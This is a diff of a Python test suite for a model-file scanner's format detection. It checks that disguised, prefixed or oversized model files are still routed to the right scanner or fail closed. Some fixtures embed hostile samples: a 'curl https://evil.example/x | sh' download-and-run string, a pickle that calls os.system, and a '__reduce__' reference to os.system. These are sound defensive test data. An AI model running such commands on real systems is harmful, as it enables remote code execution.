@@ -25,6 +25,9 @@ from modelaudit.utils.file.detection import (
     MXNET_SYMBOL_SIGNATURE_READ_BYTES,
     NEMO_ROUTING_INCONCLUSIVE_FORMAT,
     PROTO0_1_MAX_PROBE_BYTES,
+    PROTOBUF_MODEL_CANDIDATE_FORMAT,
+    SAFETENSORS_ROUTING_HEADER_PARSE_BYTES,
+    TENSORFLOW_PROTOBUF_ROUTING_INCONCLUSIVE_FORMAT,
     XGBOOST_UBJSON_ROUTING_INCONCLUSIVE_FORMAT,
     detect_file_format,
     detect_file_format_for_skip_filter,
@@ -36,8 +39,15 @@ from modelaudit.utils.file.detection import (
     validate_file_type,
 )
 from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as _has_tf_protos
-from tests.helpers import create_mock_mxnet_symbol, create_mock_onnx
-from tests.helpers.file_creators import create_v7_tar_archive
+from tests.helpers import (
+    create_mock_coreml,
+    create_mock_mxnet_symbol,
+    create_mock_onnx,
+    prefix_mock_onnx_with_branching_unknown_groups,
+    prefix_mock_onnx_with_unknown_field,
+    prefix_mock_onnx_with_unknown_group,
+)
+from tests.helpers.file_creators import _coreml_field_bytes, _coreml_field_varint, create_v7_tar_archive
 
 
 def _ubjson_key(key: bytes) -> bytes:
@@ -74,6 +84,108 @@ def _build_tf_metagraph_bytes() -> bytes:
     node.name = "const_node"
     node.op = "Const"
     return cast(bytes, metagraph.SerializeToString())
+
+
+def _build_tf_savedmodel_bytes() -> bytes:
+    import modelaudit.protos  # noqa: F401
+
+    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
+    saved_model = saved_model_pb2.SavedModel()
+    saved_model.saved_model_schema_version = 1
+    metagraph = saved_model.meta_graphs.add()
+    node = metagraph.graph_def.node.add()
+    node.name = "const_node"
+    node.op = "Const"
+    return cast(bytes, saved_model.SerializeToString())
+
+
+def _build_tf_ambiguous_savedmodel_bytes() -> bytes:
+    import modelaudit.protos  # noqa: F401
+
+    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
+    saved_model = saved_model_pb2.SavedModel()
+    saved_model.saved_model_schema_version = 1
+    metagraph = saved_model.meta_graphs.add()
+    metagraph.meta_info_def.meta_graph_version = "owner"
+    node = metagraph.graph_def.node.add()
+    node.op = "PyFunc"
+    return cast(bytes, saved_model.SerializeToString())
+
+
+def _build_tf_metainfo_bytes() -> bytes:
+    import modelaudit.protos  # noqa: F401
+
+    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
+    metagraph = meta_graph_pb2.MetaGraphDef()
+    metagraph.meta_info_def.meta_graph_version = "test_meta_graph"
+    metagraph.meta_info_def.tags.append("serve")
+    return cast(bytes, metagraph.meta_info_def.SerializeToString())
+
+
+def _build_tf_collection_only_metagraph_bytes() -> bytes:
+    import modelaudit.protos  # noqa: F401
+
+    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
+    metagraph = meta_graph_pb2.MetaGraphDef()
+    metagraph.collection_def["runtime_hook"].bytes_list.value.append(b"curl https://evil.example/x | sh")
+    return cast(bytes, metagraph.SerializeToString())
+
+
+def _build_tf_function_metagraph_bytes() -> bytes:
+    import modelaudit.protos  # noqa: F401
+
+    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
+    metagraph = meta_graph_pb2.MetaGraphDef()
+    function = metagraph.graph_def.library.function.add()
+    function.signature.name = "danger"
+    node = function.node_def.add()
+    node.name = "pyfunc_node"
+    node.op = "PyFunc"
+    return cast(bytes, metagraph.SerializeToString())
+
+
+def _build_tf_function_graph_bytes() -> bytes:
+    import modelaudit.protos  # noqa: F401
+
+    graph_pb2 = importlib.import_module("tensorflow.core.framework.graph_pb2")
+    graph = graph_pb2.GraphDef()
+    function = graph.library.function.add()
+    function.signature.name = "danger"
+    node = function.node_def.add()
+    node.name = "pyfunc_node"
+    node.op = "PyFunc"
+    return cast(bytes, graph.SerializeToString())
+
+
+def _encode_proto_varint(value: int) -> bytes:
+    out = bytearray()
+    while value >= 0x80:
+        out.append((value & 0x7F) | 0x80)
+        value >>= 7
+    out.append(value)
+    return bytes(out)
+
+
+def _proto_varint_field(field_number: int, value: int) -> bytes:
+    return _encode_proto_varint((field_number << 3) | 0) + _encode_proto_varint(value)
+
+
+def _proto_length_field(field_number: int, payload: bytes) -> bytes:
+    return _encode_proto_varint((field_number << 3) | 2) + _encode_proto_varint(len(payload)) + payload
+
+
+def _write_sparse_oversized_safetensors_candidate(path: Path) -> None:
+    """Write framing beyond the routing parse budget without allocating its header."""
+    header_len = SAFETENSORS_ROUTING_HEADER_PARSE_BYTES + 1
+    with path.open("wb") as handle:
+        handle.write(struct.pack("<Q", header_len))
+        handle.write(b"{")
+        handle.truncate(8 + header_len + 1)
+
+
+def _printable_unknown_proto_prefix(min_bytes: int) -> bytes:
+    field = b"z " + (b"x" * 32)
+    return field * ((min_bytes // len(field)) + 1)
 
 
 def test_detect_file_format_directory(tmp_path):
@@ -163,6 +275,22 @@ def test_detect_jax_json_checkpoint_with_object_after_routing_budget_fails_close
     assert detect_file_format(str(checkpoint_path)) == "jax_checkpoint"
 
 
+def test_detect_oversized_visible_ajax_prefix_stays_ambiguous_with_unseen_late_jax_identity(tmp_path: Path) -> None:
+    visible_non_jax = tmp_path / "large-ajax.jpg"
+    late_jax = tmp_path / "large-ajax-late-jax.jpg"
+    padding = "x" * (JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES + 16)
+    visible_non_jax.write_text(json.dumps({"framework": "ajax", "padding": padding}), encoding="utf-8")
+    late_jax.write_text(
+        json.dumps({"framework": "ajax", "padding": padding, "backend": "jax"}),
+        encoding="utf-8",
+    )
+
+    probe_size = JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES + 1
+    assert visible_non_jax.read_bytes()[:probe_size] == late_jax.read_bytes()[:probe_size]
+    assert detect_file_format(str(visible_non_jax)) == "jax_checkpoint"
+    assert detect_file_format(str(late_jax)) == "jax_checkpoint"
+
+
 def test_detect_oversized_jax_json_checkpoint_with_long_identity_value(tmp_path: Path) -> None:
     checkpoint_path = tmp_path / "long-identity.jpg"
     padding = "x" * (JAX_JSON_CHECKPOINT_STRUCTURE_READ_BYTES + 16)
@@ -250,8 +378,8 @@ def test_detect_msgpack_checkpoint_overlap_suffixes_as_flax_msgpack(tmp_path: Pa
     assert detect_file_format(str(checkpoint)) == "flax_msgpack"
 
 
-@pytest.mark.parametrize("suffix", [".txt", ".md", ".markdown", ".rst"])
-def test_detect_renamed_flax_checkpoint_under_document_suffix(tmp_path: Path, suffix: str) -> None:
+@pytest.mark.parametrize("suffix", [".txt", ".md", ".markdown", ".rst", ".ini", ".cfg", ".toml", ".conf"])
+def test_detect_renamed_flax_checkpoint_under_skipped_suffix(tmp_path: Path, suffix: str) -> None:
     msgpack = pytest.importorskip("msgpack")
     checkpoint = tmp_path / f"model{suffix}"
     checkpoint.write_bytes(msgpack.packb({"params": {"w": [1, 2, 3]}, "__reduce__": "os.system"}, use_bin_type=True))
@@ -261,10 +389,20 @@ def test_detect_renamed_flax_checkpoint_under_document_suffix(tmp_path: Path, su
     assert detect_file_format(str(checkpoint)) == "flax_msgpack"
 
 
-@pytest.mark.parametrize("suffix", [".txt", ".md", ".markdown", ".rst"])
-def test_detect_large_plain_document_does_not_fail_closed_as_flax(tmp_path: Path, suffix: str) -> None:
+@pytest.mark.parametrize("suffix", [".txt", ".md", ".markdown", ".rst", ".ini", ".cfg", ".toml"])
+def test_detect_oversized_ambiguous_skipped_suffix_fails_closed_as_flax(tmp_path: Path, suffix: str) -> None:
     document = tmp_path / f"notes{suffix}"
     document.write_bytes(b" " * (2 * (FLAX_MSGPACK_STRUCTURE_READ_BYTES + 1) + 2))
+
+    assert detect_file_format_from_magic(str(document)) == "flax_msgpack"
+    assert detect_file_format_for_skip_filter(str(document)) == "flax_msgpack"
+    assert detect_file_format(str(document)) == "flax_msgpack"
+
+
+@pytest.mark.parametrize("suffix", [".txt", ".md", ".markdown", ".rst", ".ini", ".cfg", ".toml"])
+def test_detect_small_plain_skipped_suffix_does_not_route_as_flax(tmp_path: Path, suffix: str) -> None:
+    document = tmp_path / f"notes{suffix}"
+    document.write_text("ordinary project documentation\n", encoding="utf-8")
 
     assert detect_file_format_from_magic(str(document)) == "unknown"
     assert detect_file_format_for_skip_filter(str(document)) == "unknown"
@@ -276,11 +414,11 @@ def test_detect_large_plain_document_does_not_fail_closed_as_flax(tmp_path: Path
     [
         (b"I1\n.", False),
         (b"cbuiltins\nstr\n.", True),
-        (b"\x80\x04.", True),
-        (b"\x80\x04(2.", True),
-        (b"\x80\x04NNa.", True),
-        (b"\x80\x04\x95" + struct.pack("<Q", 1_000_000) + b"N.", True),
-        (b"\x80\x04}.", True),
+        (b"\x80\x04.", False),
+        (b"\x80\x04(2.", False),
+        (b"\x80\x04NNa.", False),
+        (b"\x80\x04\x95" + struct.pack("<Q", 1_000_000) + b"N.", False),
+        (b"\x80\x04}.", False),
         (b"\x80\x04cos\nsystem\n(S'echo pwned'\ntR.", True),
     ],
 )
@@ -584,6 +722,25 @@ def test_detect_file_format_from_magic_malformed_safetensors_header_len_rejected
     assert detect_file_format_from_magic(str(malformed_path)) == "unknown"
 
 
+def test_detect_oversized_renamed_safetensors_candidate_for_bounded_scan(tmp_path: Path) -> None:
+    candidate_path = tmp_path / "oversized.jpg"
+    malformed_path = tmp_path / "framing-only.jpg"
+    _write_sparse_oversized_safetensors_candidate(candidate_path)
+    # Keep the negative fixture outside the unrelated MessagePack route.
+    header_len = SAFETENSORS_ROUTING_HEADER_PARSE_BYTES + 0xC1
+    with malformed_path.open("wb") as handle:
+        handle.write(struct.pack("<Q", header_len))
+        handle.write(b"\x00")
+        handle.truncate(8 + header_len + 1)
+
+    assert detect_file_format_from_magic(str(candidate_path)) == "safetensors"
+    assert detect_file_format_for_skip_filter(str(candidate_path)) == "safetensors"
+    assert detect_file_format(str(candidate_path)) == "safetensors"
+    assert detect_file_format_from_magic(str(malformed_path)) == "unknown"
+    assert detect_file_format_for_skip_filter(str(malformed_path)) == "unknown"
+    assert detect_file_format(str(malformed_path)) == "unknown"
+
+
 def test_detect_file_format_from_magic_invalid_safetensors_json_rejected(tmp_path: Path) -> None:
     malformed_path = tmp_path / "invalid-header.unknown"
     malformed_path.write_bytes(struct.pack("<Q", 1) + b"{" + b"\x00")
@@ -601,6 +758,129 @@ def test_detect_file_format_coreml_validation_passthrough(tmp_path: Path) -> Non
     assert validate_file_type(str(model_path)) is True
 
 
+def test_detect_file_format_routes_renamed_coreml_structure_and_rejects_near_match(tmp_path: Path) -> None:
+    model_path = create_mock_coreml(tmp_path / "model.jpg")
+    prefixed_model_path = create_mock_coreml(tmp_path / "prefixed-model.jpg")
+    group_prefixed_model_path = create_mock_coreml(tmp_path / "group-prefixed-model.jpg")
+    near_match = tmp_path / "near-match.jpg"
+    group_near_match = tmp_path / "group-near-match.jpg"
+    unknown_field_prefix = b"\x9a\x06\x03pad"
+    unknown_group_prefix = b"\x9b\x06\x08\x01\x9c\x06"
+    prefixed_model_path.write_bytes(unknown_field_prefix + prefixed_model_path.read_bytes())
+    group_prefixed_model_path.write_bytes(unknown_group_prefix + group_prefixed_model_path.read_bytes())
+    near_match.write_bytes(unknown_field_prefix + b"\x08\x08\x12\x03\xa2\x06\x00")
+    group_near_match.write_bytes(unknown_group_prefix + b"\x08\x08\x12\x03\xa2\x06\x00")
+
+    for recognized_path in (model_path, prefixed_model_path, group_prefixed_model_path):
+        assert detect_file_format(str(recognized_path)) == "coreml"
+        assert detect_file_format_from_magic(str(recognized_path)) == "coreml"
+        assert detect_file_format_for_skip_filter(str(recognized_path)) == "coreml"
+
+    for rejected_path in (near_match, group_near_match):
+        assert detect_file_format(str(rejected_path)) == "unknown"
+        assert detect_file_format_from_magic(str(rejected_path)) == "unknown"
+        assert detect_file_format_for_skip_filter(str(rejected_path)) == "unknown"
+
+
+@pytest.mark.parametrize(
+    "prefix",
+    [
+        b"\x08\x08" + (b"\x9a\x06\x00" * 4097),
+        b"\x08\x08" + b"\x9b\x06" + (b"\x08\x01" * 4097) + b"\x9c\x06",
+    ],
+    ids=["top-level-field-budget", "unknown-group-budget"],
+)
+def test_detect_file_format_retains_budget_exhausted_renamed_coreml_candidate(tmp_path: Path, prefix: bytes) -> None:
+    model_path = create_mock_coreml(tmp_path / "model.jpg")
+    model_path.write_bytes(prefix + model_path.read_bytes())
+
+    assert detect_file_format(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+    assert detect_file_format_from_magic(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+    assert detect_file_format_for_skip_filter(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+
+
+def test_detect_file_format_routes_renamed_coreml_with_reordered_fields(tmp_path: Path) -> None:
+    model_path = create_mock_coreml(tmp_path / "reordered.jpg", model_type_first=True)
+
+    assert detect_file_format(str(model_path)) == "coreml"
+    assert detect_file_format_from_magic(str(model_path)) == "coreml"
+    assert detect_file_format_for_skip_filter(str(model_path)) == "coreml"
+
+
+def test_detect_file_format_routes_renamed_coreml_with_large_model_payload(tmp_path: Path) -> None:
+    model_path = create_mock_coreml(tmp_path / "large-model.jpg", model_type_padding=(1024 * 1024) + 1)
+
+    assert detect_file_format(str(model_path)) == "coreml"
+    assert detect_file_format_from_magic(str(model_path)) == "coreml"
+    assert detect_file_format_for_skip_filter(str(model_path)) == "coreml"
+
+
+def test_detect_file_format_routes_renamed_coreml_after_long_varint_prefix(tmp_path: Path) -> None:
+    model_path = create_mock_coreml(tmp_path / "long-varint-prefix.jpg")
+    long_unknown_key = _encode_proto_varint((1 << 35) << 3 | 2)
+    model_path.write_bytes(long_unknown_key + b"\x00" + model_path.read_bytes())
+
+    assert detect_file_format(str(model_path)) == "coreml"
+    assert detect_file_format_from_magic(str(model_path)) == "coreml"
+    assert detect_file_format_for_skip_filter(str(model_path)) == "coreml"
+
+
+def test_detect_file_format_routes_renamed_coreml_serialized_model(tmp_path: Path) -> None:
+    description = _coreml_field_bytes(100, _coreml_field_bytes(1, b"Mock CoreML model"))
+    serialized_model = (
+        _coreml_field_varint(1, 8)
+        + _coreml_field_bytes(2, description)
+        + _coreml_field_bytes(3000, _coreml_field_bytes(1, b"payload"))
+    )
+    model_path = tmp_path / "serialized-model.jpg"
+    model_path.write_bytes(serialized_model)
+
+    assert detect_file_format(str(model_path)) == "coreml"
+    assert detect_file_format_from_magic(str(model_path)) == "coreml"
+    assert detect_file_format_for_skip_filter(str(model_path)) == "coreml"
+
+
+def test_detect_file_format_rejects_empty_renamed_coreml_model_payload(tmp_path: Path) -> None:
+    description = _coreml_field_bytes(100, _coreml_field_bytes(1, b"Mock CoreML model"))
+    near_match = _coreml_field_varint(1, 8) + _coreml_field_bytes(2, description) + _coreml_field_bytes(500, b"")
+    model_path = tmp_path / "empty-model-type.jpg"
+    model_path.write_bytes(near_match)
+
+    assert detect_file_format(str(model_path)) == "unknown"
+    assert detect_file_format_from_magic(str(model_path)) == "unknown"
+    assert detect_file_format_for_skip_filter(str(model_path)) == "unknown"
+
+
+def test_detect_file_format_retains_oversized_coreml_description_candidate(tmp_path: Path) -> None:
+    model_path = tmp_path / "large-description.jpg"
+    model_path.write_bytes(
+        _coreml_field_varint(1, 8)
+        + _encode_proto_varint((2 << 3) | 2)
+        + _encode_proto_varint((1024 * 1024) + 1)
+        + (b"a" * ((1024 * 1024) + 1))
+        + _coreml_field_bytes(500, _coreml_field_bytes(1, b"layer"))
+    )
+
+    assert detect_file_format(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+    assert detect_file_format_from_magic(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+    assert detect_file_format_for_skip_filter(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+
+
+def test_detect_file_format_retains_oversized_unknown_coreml_prefix_candidate(tmp_path: Path) -> None:
+    model_path = create_mock_coreml(tmp_path / "large-unknown-prefix.jpg")
+    model_path.write_bytes(
+        _coreml_field_varint(1, 8)
+        + _encode_proto_varint((123 << 3) | 2)
+        + _encode_proto_varint((1024 * 1024) + 1)
+        + (b"x" * ((1024 * 1024) + 1))
+        + model_path.read_bytes()
+    )
+
+    assert detect_file_format(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+    assert detect_file_format_from_magic(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+    assert detect_file_format_for_skip_filter(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+
+
 def test_detect_file_format_onnx_pb_content_hint_preempts_protobuf_extension(tmp_path: Path) -> None:
     """ONNX protobuf payloads renamed to .pb should route to ONNX, not TensorFlow protobuf."""
     pytest.importorskip("onnx")
@@ -610,6 +890,137 @@ def test_detect_file_format_onnx_pb_content_hint_preempts_protobuf_extension(tmp
     assert detect_file_format(str(model_path)) == "onnx"
     assert detect_file_format_from_magic(str(model_path)) == "onnx"
     assert validate_file_type(str(model_path)) is True
+
+
+def test_detect_file_format_routes_prefixed_renamed_onnx_by_bounded_structure(tmp_path: Path) -> None:
+    """Unknown protobuf fields before ONNX content must not defeat content routing."""
+    pytest.importorskip("onnx")
+    model_path = tmp_path / "model.jpg"
+    create_mock_onnx(model_path)
+    prefix_mock_onnx_with_unknown_field(model_path, value_size=(1024 * 1024) + 32)
+
+    assert detect_file_format(str(model_path)) == "onnx"
+    assert detect_file_format_from_magic(str(model_path)) == "onnx"
+    assert detect_file_format_for_skip_filter(str(model_path)) == "onnx"
+
+
+@pytest.mark.parametrize("prefix_field_number", [8, 9, 63])
+def test_detect_file_format_marks_budget_exhausted_prefixed_renamed_onnx_as_candidate(
+    tmp_path: Path,
+    prefix_field_number: int,
+) -> None:
+    """A long valid prefix must survive filtering without a premature format guess."""
+    pytest.importorskip("onnx")
+    model_path = create_mock_onnx(tmp_path / f"many-prefixes-{prefix_field_number}.jpg")
+    prefix_mock_onnx_with_unknown_field(model_path, value_size=0, count=4097, field_number=prefix_field_number)
+
+    assert detect_file_format(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+    assert detect_file_format_from_magic(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+    assert detect_file_format_for_skip_filter(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+
+
+def test_validate_file_type_accepts_budget_exhausted_onnx_candidate_with_onnx_suffix(tmp_path: Path) -> None:
+    pytest.importorskip("onnx")
+    model_path = create_mock_onnx(tmp_path / "many-prefixes.onnx")
+    prefix_mock_onnx_with_unknown_field(model_path, value_size=0, count=4097, field_number=8)
+
+    assert detect_file_format_from_magic(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+    assert detect_file_format(str(model_path)) == "onnx"
+    assert validate_file_type(str(model_path)) is True
+
+
+def test_budget_exhausted_onnx_candidate_with_protobuf_suffix_still_routes_to_analysis(tmp_path: Path) -> None:
+    pytest.importorskip("onnx")
+    model_path = create_mock_onnx(tmp_path / "many-prefixes.pb")
+    prefix_mock_onnx_with_unknown_field(model_path, value_size=0, count=4097, field_number=8)
+
+    assert detect_file_format_from_magic(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+    assert detect_file_format(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+
+
+def test_budget_exhausted_protobuf_probe_does_not_steal_coreml_extension_route(tmp_path: Path) -> None:
+    model_path = tmp_path / "ambiguous.mlmodel"
+    model_path.write_bytes(b"\x42\x00" * 4097)
+
+    assert detect_file_format_from_magic(str(model_path)) == "coreml"
+    assert detect_file_format(str(model_path)) == "coreml"
+    assert validate_file_type(str(model_path)) is True
+
+
+def test_detect_budget_exhausted_onnx_flax_overlap_keeps_existing_flax_owner(tmp_path: Path) -> None:
+    """An ambiguous MessagePack overlap must remain on its fail-closed owner route."""
+    pytest.importorskip("onnx")
+    model_path = create_mock_onnx(tmp_path / "flax-overlap.jpg")
+    prefix_mock_onnx_with_unknown_field(model_path, value_size=0, count=4097, field_number=100)
+
+    assert detect_file_format(str(model_path)) == "flax_msgpack"
+    assert detect_file_format_from_magic(str(model_path)) == "flax_msgpack"
+    assert detect_file_format_for_skip_filter(str(model_path)) == "flax_msgpack"
+
+
+def test_detect_file_format_routes_group_prefixed_renamed_onnx_by_bounded_structure(tmp_path: Path) -> None:
+    """Deprecated but legal unknown protobuf groups must not hide ONNX content."""
+    pytest.importorskip("onnx")
+    model_path = create_mock_onnx(tmp_path / "group-model.jpg")
+    prefix_mock_onnx_with_unknown_group(model_path, nested_field_count=1)
+
+    assert detect_file_format(str(model_path)) == "onnx"
+    assert detect_file_format_from_magic(str(model_path)) == "onnx"
+    assert detect_file_format_for_skip_filter(str(model_path)) == "onnx"
+
+
+def test_detect_file_format_retains_budget_exhausted_group_prefixed_renamed_onnx_candidate(
+    tmp_path: Path,
+) -> None:
+    """A bounded group walk must fail closed rather than skip renamed ONNX."""
+    pytest.importorskip("onnx")
+    model_path = create_mock_onnx(tmp_path / "group-budget-model.jpg")
+    prefix_mock_onnx_with_unknown_group(model_path)
+
+    assert detect_file_format(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+    assert detect_file_format_from_magic(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+    assert detect_file_format_for_skip_filter(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+
+
+def test_detect_file_format_retains_branching_group_budget_candidate(tmp_path: Path) -> None:
+    """Nested legal groups share one bounded routing budget across branches."""
+    pytest.importorskip("onnx")
+    model_path = create_mock_onnx(tmp_path / "branching-groups.jpg")
+    prefix_mock_onnx_with_branching_unknown_groups(model_path)
+
+    assert detect_file_format(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+    assert detect_file_format_from_magic(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+    assert detect_file_format_for_skip_filter(str(model_path)) == PROTOBUF_MODEL_CANDIDATE_FORMAT
+
+
+def test_detect_file_format_rejects_unknown_prefixed_generic_protobuf(tmp_path: Path) -> None:
+    """A legal unknown prefix is insufficient without ONNX graph structure."""
+    generic_path = tmp_path / "metadata.jpg"
+    generic_path.write_bytes(b"\xa2\x06\x04xxxx\x12\x02\x08\x01")
+
+    assert detect_file_format(str(generic_path)) == "unknown"
+    assert detect_file_format_from_magic(str(generic_path)) == "unknown"
+    assert detect_file_format_for_skip_filter(str(generic_path)) == "unknown"
+
+
+def test_detect_file_format_rejects_group_prefixed_generic_protobuf(tmp_path: Path) -> None:
+    """Skipping an unknown group still requires ONNX graph structure afterward."""
+    generic_path = tmp_path / "group-metadata.jpg"
+    generic_path.write_bytes(b"\xa3\x06\x08\x01\xa4\x06\x12\x02\x08\x01")
+
+    assert detect_file_format(str(generic_path)) == "unknown"
+    assert detect_file_format_from_magic(str(generic_path)) == "unknown"
+    assert detect_file_format_for_skip_filter(str(generic_path)) == "unknown"
+
+
+def test_detect_file_format_rejects_invalid_known_protobuf_field_near_match(tmp_path: Path) -> None:
+    """Wrong wire types for known model fields must not become bounded candidates."""
+    generic_path = tmp_path / "invalid-known-field.jpg"
+    generic_path.write_bytes(b"\x10\x00" * 4097)
+
+    assert detect_file_format(str(generic_path)) == "unknown"
+    assert detect_file_format_from_magic(str(generic_path)) == "unknown"
+    assert detect_file_format_for_skip_filter(str(generic_path)) == "unknown"
 
 
 def test_detect_file_format_rejects_incidental_onnx_pb_string(tmp_path: Path) -> None:
@@ -1390,6 +1801,354 @@ def test_detect_tf_metagraph_by_strict_parse(tmp_path: Path) -> None:
     assert validate_file_type(str(metagraph_path)) is True
 
 
+def test_detect_tf_metagraph_pb_suffix_validates_when_routed_by_content(tmp_path: Path) -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+
+    metagraph_path = tmp_path / "graph.pb"
+    metagraph_path.write_bytes(_build_tf_metagraph_bytes())
+
+    assert detect_format_from_extension(str(metagraph_path)) == "protobuf"
+    assert detect_file_format(str(metagraph_path)) == "tf_metagraph"
+    assert detect_file_format_from_magic(str(metagraph_path)) == "tf_metagraph"
+    assert validate_file_type(str(metagraph_path)) is True
+
+
+def test_detect_tf_savedmodel_meta_suffix_validates_when_routed_by_content(tmp_path: Path) -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+
+    savedmodel_path = tmp_path / "saved.meta"
+    savedmodel_path.write_bytes(_build_tf_savedmodel_bytes())
+
+    assert detect_format_from_extension(str(savedmodel_path)) == "tf_metagraph"
+    assert detect_file_format(str(savedmodel_path)) == "tf_savedmodel"
+    assert detect_file_format_from_magic(str(savedmodel_path)) == "tf_savedmodel"
+    assert validate_file_type(str(savedmodel_path)) is True
+
+
+def test_detect_renamed_tf_metagraph_by_strict_parse_without_promoting_generic_protobuf(tmp_path: Path) -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+
+    disguised_metagraph = tmp_path / "graph.jpg"
+    generic_protobuf = tmp_path / "generic.jpg"
+    disguised_metagraph.write_bytes(b"\xa2\x06\x80\x08" + (b"x" * 1024) + _build_tf_metagraph_bytes())
+    generic_protobuf.write_bytes(b"\x12\x02\x08\x01")
+
+    assert detect_file_format_from_magic(str(disguised_metagraph)) == "tf_metagraph"
+    assert detect_file_format_for_skip_filter(str(disguised_metagraph)) == "tf_metagraph"
+    assert detect_file_format(str(disguised_metagraph)) == "tf_metagraph"
+    assert detect_file_format_from_magic(str(generic_protobuf)) == "unknown"
+    assert detect_file_format_for_skip_filter(str(generic_protobuf)) == "unknown"
+    assert detect_file_format(str(generic_protobuf)) == "unknown"
+
+
+def test_detect_renamed_tf_savedmodel_by_strict_parse_without_promoting_generic_protobuf(tmp_path: Path) -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+
+    disguised_savedmodel = tmp_path / "saved.jpg"
+    generic_protobuf = tmp_path / "generic.jpg"
+    disguised_savedmodel.write_bytes(_build_tf_savedmodel_bytes())
+    generic_protobuf.write_bytes(b"\x12\x02\x08\x01")
+
+    assert detect_file_format_from_magic(str(disguised_savedmodel)) == "tf_savedmodel"
+    assert detect_file_format_for_skip_filter(str(disguised_savedmodel)) == "tf_savedmodel"
+    assert detect_file_format(str(disguised_savedmodel)) == "tf_savedmodel"
+    assert detect_file_format_from_magic(str(generic_protobuf)) == "unknown"
+    assert detect_file_format_for_skip_filter(str(generic_protobuf)) == "unknown"
+    assert detect_file_format(str(generic_protobuf)) == "unknown"
+
+
+def test_detect_renamed_tf_metagraph_routes_collection_only_structure(tmp_path: Path) -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+
+    collection_only_metagraph = tmp_path / "collection-only.jpg"
+    collection_only_metagraph.write_bytes(_build_tf_collection_only_metagraph_bytes())
+
+    assert detect_file_format_from_magic(str(collection_only_metagraph)) == "tf_metagraph"
+    assert detect_file_format_for_skip_filter(str(collection_only_metagraph)) == "tf_metagraph"
+    assert detect_file_format(str(collection_only_metagraph)) == "tf_metagraph"
+
+
+def test_detect_renamed_tf_metagraph_function_library_stays_on_metagraph_route(tmp_path: Path) -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+
+    function_metagraph = tmp_path / "function-only.jpg"
+    function_metagraph.write_bytes(_build_tf_function_metagraph_bytes())
+
+    assert detect_file_format_from_magic(str(function_metagraph)) == "tf_metagraph"
+    assert detect_file_format_for_skip_filter(str(function_metagraph)) == "tf_metagraph"
+    assert detect_file_format(str(function_metagraph)) == "tf_metagraph"
+
+
+def test_detect_renamed_tf_metagraph_after_printable_unknown_prefix(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+
+    monkeypatch.setattr(file_detection, "JAX_JSON_CHECKPOINT_ROUTING_READ_BYTES", 64)
+    prefixed_metagraph = tmp_path / "prefixed-function.jpg"
+    prefixed_metagraph.write_bytes(_printable_unknown_proto_prefix(65) + _build_tf_function_metagraph_bytes())
+
+    assert detect_file_format_from_magic(str(prefixed_metagraph)) == "tf_metagraph"
+    assert detect_file_format_for_skip_filter(str(prefixed_metagraph)) == "tf_metagraph"
+    assert detect_file_format(str(prefixed_metagraph)) == "tf_metagraph"
+
+
+def test_detect_complete_printable_text_does_not_route_as_tensorflow(tmp_path: Path) -> None:
+    printable_payload = tmp_path / "notes.jpg"
+    printable_payload.write_bytes((b"TensorFlow model documentation only\n" * 4096) + b"A")
+
+    assert detect_file_format_from_magic(str(printable_payload)) == "unknown"
+    assert detect_file_format_for_skip_filter(str(printable_payload)) == "unknown"
+    assert detect_file_format(str(printable_payload)) == "unknown"
+
+
+def test_detect_renamed_tf_protobuf_rejects_empty_graph_node_near_match(tmp_path: Path) -> None:
+    if not _has_tf_protos():
+        pytest.skip("TensorFlow protobuf stubs unavailable")
+
+    empty_node_metagraph = tmp_path / "empty-node-metagraph.jpg"
+    empty_node_savedmodel = tmp_path / "empty-node-savedmodel.jpg"
+    empty_node_metagraph.write_bytes(_proto_length_field(2, b"\x0a\x00"))
+    empty_node_savedmodel.write_bytes(_proto_length_field(2, _proto_length_field(2, b"\x0a\x00")))
+
+    assert detect_file_format_from_magic(str(empty_node_metagraph)) == "unknown"
+    assert detect_file_format_for_skip_filter(str(empty_node_metagraph)) == "unknown"
+    assert detect_file_format(str(empty_node_metagraph)) == "unknown"
